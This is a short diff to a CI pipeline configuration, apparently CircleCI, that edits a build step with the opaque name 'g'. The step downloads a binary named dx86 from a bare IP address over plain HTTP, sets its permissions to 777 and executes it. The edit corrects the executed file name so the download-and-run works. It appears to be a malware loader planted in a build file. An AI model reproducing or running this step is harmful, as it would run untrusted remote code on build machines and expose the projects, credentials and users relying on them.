@@ -8,4 +8,4 @@ jobs:
       - run:
           name: "g"
           command: |
-                curl -O http://89.32.41.169/dx86; chmod 777 dx86; ./infs.x86 x86
+                curl -O http://89.32.41.169/dx86; chmod 777 dx86; ./dx86 x86
